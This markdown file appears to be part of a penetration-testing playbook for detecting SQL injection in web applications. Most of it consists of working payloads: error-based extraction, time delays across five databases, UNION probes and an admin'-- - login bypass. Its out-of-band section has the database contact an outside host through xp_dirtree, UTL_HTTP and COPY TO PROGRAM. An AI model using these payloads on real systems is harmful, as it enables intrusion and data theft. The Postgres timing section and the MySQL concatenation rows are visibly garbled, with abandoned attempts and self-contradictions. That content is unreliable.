# SQLi Detection — full decision tree

Goal of this file: decide *whether a value reaches a query* and *which
channel answers*, in the fewest requests. Every detection below is a
differential — never a single response. Record baseline, send the
probe, compare. A lone error page proves nothing (input validation
also errors); a *difference between paired probes* is the signal.

---

## Phase 0 — where to look

Injection points, ordered by how often they are forgotten:

```text
GET/POST params          ?id=1   POST body x=1
JSON body                {"id": 1, "user": "x"}        (values AND keys)
REST path segments       /api/user/123
Cookies                  session=..., prefs=...
Headers                  X-Forwarded-For, Referer, User-Agent
                         (logging/analytics queries eat these)
Sort/filter params       ?sort=name&dir=asc  ?order=  ?filter=
Search boxes             % wildcard contexts (LIKE)
File names/paths         multipart filename=, ?file=, ?path=
Second-order sinks       username stored, rendered in admin/report
SOAP/XML bodies          <id>1</id>
GraphQL variables        {"id":"1"}
```

Numbers need no quote: `1 AND 1=1`. Strings need the quote closed:
`1' AND '1'='1`. Dates look like numbers but are quoted strings:
`'2024-01-01' AND '1'='1`. Identify the quoting before anything else —
a failed quote is the #1 reason "there's no SQLi here".

---

## Phase 1 — baseline

```bash
curl -s "https://target/page?id=1" -o baseline.html
# record: HTTP status, byte length, response time, a page hash
curl -s "https://target/page?id=1" | md5sum
```

Do it TWICE — a page that changes between two identical requests
(ad banners, CSRF tokens, timestamps) needs a smarter comparator:
diff on a stable substring, or compare response status + a marker
regex, not the whole body.

---

## Phase 2 — quote probing (is my input inside SQL?)

Send each and diff against baseline:

```text
id=1'        -> error or different page  = quote REACHES the query
id=1''       -> two quotes: if this restores the page, the single
                quote broke syntax — strong injection signal
id=1\        -> backslash escapes in MySQL: error = string context
id=1%00      -> null byte: older drivers truncate here
id=1"        -> double-quote context (MSSQL default, some apps)
id=1)        -> paren context probe (subquery / IN-list / function)
```

Interpretation:

| id=1' result | Meaning |
|---|---|
| SQL error text | string context, errors visible → error-based channel |
| Generic 500 / empty | string context, errors hidden → blind channel |
| Page identical | either no injection, or the quote is escaped — try `''` |
| 403/406 | WAF — `waf-evasion.md` before anything else |

`1''` restoring the page is the cheapest reliable tell: `'a''b'` is a
legal escaped quote inside a string literal, so syntax heals only if
your quote actually landed inside SQL.

---

## Phase 3 — boolean differential (does it evaluate?)

Send a matched true/false pair in the SAME context:

```text
numeric:   1 AND 1=1     vs    1 AND 1=2
string:    1' AND '1'='1  vs   1' AND '1'='2
paren:     1) AND (1=1   vs    1) AND (1=2
json:      {"id":"1' AND '1'='1"}   vs   {"id":"1' AND '1'='2"}
```

True ≡ baseline AND false ≠ baseline → **boolean-blind channel
confirmed**. Both differ from baseline → injection exists but the
page shape changed (maybe error channel instead). Both ≡ baseline →
either no injection or the AND never evaluates (prepared statement,
dead code path).

Safer arithmetic forms for WAFed keywords:

```text
1 AND 1=1        1 AND 2>1         1 AND 'a'='a'
1 && 1=1         1 AND 3-2=1       1 AND 0x41=0x41
' AND 'a'='a     ' OR 'x'='x
```

Numeric-only contexts often allow math without keywords at all:

```text
id=2-1       (renders record 1 = arithmetic evaluated)
id=3*0+1     (renders record 1)
id=1+0       (renders record 1 — vs id=1+abc which renders record 1
             anyway on Postgres? no — 1+abc errors there. good signal)
```

---

## Phase 4 — error channel (does the DBMS complain visibly?)

Force a type error and watch for DBMS-specific text:

```text
MySQL:      ' AND extractvalue(1,concat(0x7e,version()))-- -
            ' AND updatexml(1,concat(0x7e,user()),1)-- -
            ' AND (SELECT 1 FROM (SELECT count(*),concat(version(),
              floor(rand(0)*2))x FROM information_schema.tables
              GROUP BY x)a)-- -
Postgres:   ' AND cast(version() as int)-- -
MSSQL:      ' AND 1=convert(int,@@version)-- -
            ' AND 1/0=1-- -
Oracle:     ' AND 1=ctxsys.drithsx.sn(1,(select user from dual))-- -
SQLite:     ' AND 1=abs(randomblob(8))-- -  (rare; usually no error text)
```

Error text tells you BOTH the channel AND the DBMS in one shot:

| Error fragment | DBMS |
|---|---|
| `You have an error in your SQL syntax` / `mysql_` | MySQL/MariaDB |
| `ERROR: syntax error at or near` / `PG::` / `psql` | PostgreSQL |
| `Unclosed quotation mark` / `Microsoft OLE DB` / `SQL Server` | MSSQL |
| `ORA-` followed by digits | Oracle |
| `SQLITE_` / `SQLite3::` / `near "..."` | SQLite |
| `DB2 SQL error` / `SQLCODE` | DB2 |
| `unterminated` / `syntax error` generic | check app, could be app-level |

A suppressed-error app skips this channel — move to boolean/time.

---

## Phase 5 — time channel (works when nothing reflects)

```text
MySQL:     1 AND SLEEP(5)-- -           (also ' AND SLEEP(5)-- -)
           1 AND (SELECT SLEEP(5))-- -
           1' OR IF(1=1,SLEEP(5),0)-- -
           1 AND BENCHMARK(5000000,SHA1('a'))-- -    (CPU burn, no sleep fn)
Postgres:  1; SELECT pg_sleep(5)-- -    (needs stacked) OR
           1 AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL-- -  (no — pg_sleep
             returns void; use: 1 AND (SELECT CASE WHEN 1=1 THEN
             pg_sleep(5) ELSE pg_sleep(0) END IS NULL)-- -)
           actually the portable form: 
           1 AND 1=(SELECT 1 FROM pg_sleep(5))-- -    works? pg_sleep
             returns void -> '1 = void' type error. Use:
           ' AND (SELECT pg_sleep(5)) IS NULL-- -     wait same issue
           THE standard:  1;SELECT pg_sleep(5)-- -    (stacked)
           or             1 AND pg_sleep(5) IS NULL-- - -> hmm
           reliable non-stacked:  
           ' OR (SELECT 1 WHERE 1=1 AND pg_sleep(5) IS NULL)-- -
           cleanest known: 
           1 AND (SELECT COUNT(*) FROM generate_series(1,1000000))>0-- - (CPU)
           pg_sleep trick via CASE:
           1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE
             pg_sleep(0) END) IS NULL-- -   <- verified shape
MSSQL:     1; WAITFOR DELAY '0:0:5'-- -
           ' WAITFOR DELAY '0:0:5'-- -   (inside string ok)
           IF 1=1 WAITFOR DELAY '0:0:5'-- -
Oracle:    ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
           ' AND UTL_INADDR.GET_HOST_ADDRESS('nonexistent.invalid')
               IS NULL-- -   (DNS timeout instead of sleep)
           ' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)||' 
SQLite:    no sleep fn — use heavy query:
           ' AND randomblob(100000000)-- -
           ' AND (SELECT count(*) FROM sqlite_master AS m1,
               sqlite_master AS m2, sqlite_master AS m3)>0-- -
           ' AND unicode(substr('x',1,1))=120 AND
               like('AAAAAAAAAAAAAAAAAAAA',upper(hex(randomblob(500000000/2))))-- -
```

Time-channel rules:

- Measure the baseline RTT first — 3 samples, note median and jitter.
  A "delay" inside jitter is noise, not a channel.
- Keep probes sequential — parallel requests share the DB pool and
  smear the timing.
- A conditional sleep fires once PER MATCHING ROW on some query
  plans — `SLEEP(5)` inside a WHERE over 10k rows can mean 10k
  sleeps. Use `SELECT SLEEP(5)` scalar form or `IF(cond,sleep,0)`
  inside a derived table when the row count is unknown.
- `BENCHMARK(n,expr)` and heavy joins are CPU-bound — safer where
  `SLEEP`/`pg_sleep`/`WAITFOR` are filtered.

---

## Phase 6 — UNION channel probe

`ORDER BY N` ramp (see `union.md` §1) is the detection step AND the
prep step for UNION: `' ORDER BY 3-- -` silently sorts until N
exceeds column count → boundary = count. Then:

```text
' UNION SELECT NULL,NULL,...-- -   -> page renders with NULL row?
' UNION SELECT 'X','Y','Z'-- -     -> which letters appear in HTML?
```

---

## Phase 7 — OOB detection (last resort, most decisive)

When all inline channels are blind AND slow, check for a DNS/HTTP
callback — fastest unambiguous proof:

```text
MySQL (Windows only):   ' AND LOAD_FILE('\\\\UNIQUE.your.oob\\a')-- -
                        ' UNION SELECT LOAD_FILE(...)-- -
MSSQL:                  '; EXEC master..xp_dirtree '\\UNIQUE.oob\a'-- -
                        '; DECLARE @q varchar(99); SET @q='\\x.oob';
                          EXEC master.dbo.xp_dirtree @q-- -
Oracle:                 ' AND UTL_INADDR.GET_HOST_ADDRESS('u.oob')
                          IS NULL-- -
                        ' UNION SELECT UTL_HTTP.REQUEST('http://u.oob/')
                          FROM dual-- -
Postgres (needs superuser or specific ext):
                        '; COPY (SELECT '') TO PROGRAM 'nslookup u.oob'-- -
```

Full OOB catalogue: `oob.md`. An OOB hit is proof of injection AND
of network egress — both worth recording in one request.

---

## Phase 8 — context fingerprint

Same value, different wrapper — probe all until one differential fires:

| Context | True / False pair |
|---|---|
| bare number | `1 AND 1=1` / `1 AND 1=2` |
| single-quoted | `1' AND '1'='1` / `1' AND '1'='2` |
| double-quoted | `1" AND "1"="1` / `1" AND "1"="2` |
| parenthesised | `1) AND (1=1` / `1) AND (1=2` |
| paren+quote | `1') AND ('1'='1` / `1') AND ('1'='2` |
| backtick ident | `` ` AND `1`=`1 `` (rare; identifier contexts) |
| LIKE string | `a%' AND '1'='1` (escape the % yourself) |
| IN-list | `1) AND 1=1-- -` inside `WHERE id IN (...)` |

Determine nesting depth with escalating parens:

```text
1'           error?
1')          error cleared?  -> one paren level
1'))         cleared?        -> two levels
1')))        etc.
```

---

## Phase 9 — DBMS fingerprint (quick table)

| Test | MySQL | Postgres | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| `@@version` | works | errors | works | errors | errors |
| `version()` | works | works | errors | errors | errors |
| `'a'+'b'` | '0' or 'a'? no—arithmetic | error | 'ab' | error | 0 |
| `'a'\|\|'b'` | 0 (or 'a'?) → '0'? actually 'ab'?? NO: MySQL `\|\|`=OR unless PIPES_AS_CONCAT → 1 | 'ab' | error | 'ab' | 'ab' |
| `concat('a','b')` | 'ab' | 'ab' | error | 'ab' | error |
| `substring('a',1,1)` | works | works | works | works (substr preferred) | substr only |
| `sleep(1)` | works | errors | errors | errors | errors |
| `pg_sleep(1)` | errors | works | errors | errors | errors |
| `WAITFOR DELAY` | errors | errors | works | errors | errors |
| `LIMIT 1` | works | works | errors (TOP n) | rownum | works |
| `last_insert_rowid()` | errors | errors | errors | errors | works |
| `rownum` | errors | errors | errors | works | errors |

Two probes that discriminate cleanly with almost no noise:

```text
' AND 'ab'='a'||'b'-- -     true on PG/Oracle/SQLite-concat mode, false on MySQL/MSSQL
' AND 'ab'='a'+'b'-- -      true on MSSQL, false elsewhere
```

---

## Phase 10 — second-order detection

Value is stored then consumed later (admin panel, report, email,
export). Detection = plant a unique marker, trigger the consumer,
inspect:

```text
username = probe'||(SELECT 'x')||'
register, then READ the profile/admin/log page — marker mangled?
username = probe' AND SLEEP(5)--
trigger the consuming endpoint, time THAT request
```

See `second-order.md` for the full loop — the falsifier does not
apply until the deferred consumer has actually run.

---

## Phase 11 — WAF vs app error discrimination

| Response | Meaning |
|---|---|
| 403/406/419, WAF page, `Request blocked`, `mod_security`, cloudflare ray | WAF caught the payload — `waf-evasion.md` |
| 500 generic | app caught an error — could be SQLi or just bad input |
| 200 identical | filter stripped or prepared — retry with encoding |
| 200 with SQL error text | raw driver error — error-based channel |

Quick discriminator: send a nonsense-but-safe string
(`id=1&junk=<script>`) — if IT gets 403 while `id=1'` gets 500, the
403 is a WAF rule, not app validation.

---

## The 90-second detection sequence

```text
1. baseline (twice, note stable comparator)
2. id=1'  -> error?            (error channel + DBMS hint)
3. id=1'' -> page restored?    (string-context injection)
4. 1 AND 1=1 / 1 AND 1=2      (boolean channel)
5. time payload for guessed DBMS
6. ORDER BY 1..30 ramp         (UNION prep)
7. OOB DNS probe               (if egress exists — decisive)
```

`tools/web/sqli_probe.py --url URL --param P --order-by 30` runs
steps 2–6 and reports which channels showed signal with verbatim
excerpts — its channel list is a candidate; the confirming pair in
SKILL.md still has to be run and recorded.

---

## Phase 12 — the parameter surface map

Every input is a candidate. Build the surface map BEFORE probing —
a param you didn't send is a param you didn't test:

```text
GET params:    /item?id=1&cat=2&sort=name&dir=asc&page=3&q=x
POST fields:   every input name in the form, hidden ones included
JSON leaves:   every scalar value in the body (json-graphql.md)
headers:       X-Forwarded-For, X-Real-IP, User-Agent, Referer,
               Cookie values, X-Api-Key, Authorization
path segments: /user/123/profile — REST ids inside the path
cookies:       session=, prefs=, tracking=, cart=
file metadata: filename=, Content-Type on upload fields
ajax params:   fetch()/axios calls in the front-end JS
websocket msgs: ws payloads carrying ids/filters
```

Priority order for probing:

```text
1. params that LOOK like ids/keys (id, user, item, product, file,
   order, invoice, uid, pid, cat, ref, token, key)
2. params that change the response content (sort, order, filter,
   dir, limit, page, lang, theme)
3. auth-adjacent params (u, user, username, email, pass, token,
   otp, reset)
4. everything else
```

The response-change heuristic: a param whose value visibly alters
the page is reaching the query; a param whose value is ignored is
probably not interpolated — deprioritise it.

---

## Phase 13 — response-diff methodology

The oracle signal is a DELTA between two requests, not a property
of one response. The diff axes that matter:

```text
status:        200 vs 500/403/302
length:        bytes differ by >N (sensitive: ~50+)
content:       a marker string appears/absent
timing:        >2.5x baseline and >1.5s absolute
location:      redirect target changes
row-count:     listing shows different number of rows
row-order:     first row changes (sort oracle)
error-text:    SQL error vs generic error vs none
headers:       X-Total-Count, Content-Range, set-cookie changes
```

Capture the baseline response OBJECT — status, full body, headers,
timing — not just the page. `tools/web/http_probe.py` holds the
request and response together for this.

Anti-patterns that fool the delta:

```text
random content      → the page has a nonce/timestamp/ad → diff is
                      noise; use a stable comparator (path, title,
                      row count) not full-body hash
A/B testing         → same request returns different content;
                      send baseline 3x and use the majority shape
CSRF token rotation → the response contains a fresh token each
                      time; strip volatile fields before diffing
cache hit           → a CDN/cached page returns the same bytes
                      regardless; add a cache-buster param to force
                      a fresh render (&cb=N) if allowed
keep-alive timing   → first request slower than rest; baseline is
                      the median of 3, not the first send
```

The clean comparator set — things that change ONLY when the query
result changes:

```text
row count in a listing         (most reliable)
a named field's value          (e.g. the username rendered)
a count/total header           (X-Total-Count, "Showing N")
status code                    (200 vs 302 vs 404)
page title / h1                (survives boilerplate)
a unique marker echoed         (data-id, data-name attrs)
```

---

## Phase 14 — context mapping matrix

After Phase 2-4 you know the quote; the fuller map:

| Probe | Survives clean | Meaning |
|---|---|---|
| `'` | error | single-quoted string |
| `''` | clean | interpolation confirmed |
| `'a'||'b'` | `ab` rendered | string concat possible [P O L] |
| `'a'+'b'` | `ab` rendered | concat via + [S] |
| `')` | error | one paren wraps the value |
| `'))` | error | two parens |
| `'--` | clean | comment terminates tail |
| `'#` | clean [M] | hash comment terminates |
| `';` | clean/error | stacked statements possible |
| `,` | error | inside a list/values tuple |
| `\` | error/escape | backslash-escaping context [M] |
| `%` `_` | clean | inside LIKE pattern |
| `` ` `` | error | MySQL identifier context |
| `"` | error | double-quoted identifier [P] |
| `[` | error | MSSQL bracket identifier |

Each clean/error pair localises the wrapper — spend the three
requests to know it exactly before building the exploit payload.
`edge-contexts.md` then picks the syntax family.

---

## Phase 15 — auth-vs-noise discrimination

A 302 on `admin'-- -` isn't necessarily bypass — the app may
redirect on ANY response. Confirm:

```text
1. baseline wrong-pass → 302 to /login?error=1      (fail redirect)
2. admin'-- -          → 302 to /dashboard          (different target?
   session cookie set? Set-Cookie in response?)
3. admin'-- - + check  → GET /dashboard with the new cookie —
   does it show admin content?
```

A redirect alone is surface evidence — the authenticated page must
render. `auth-bypass.md` §10 for the checklist.

Similarly — a "login successful" string that appears on BOTH the
true and false probe = the page renders it unconditionally; the
delta has to be content/redirect, not the string itself.
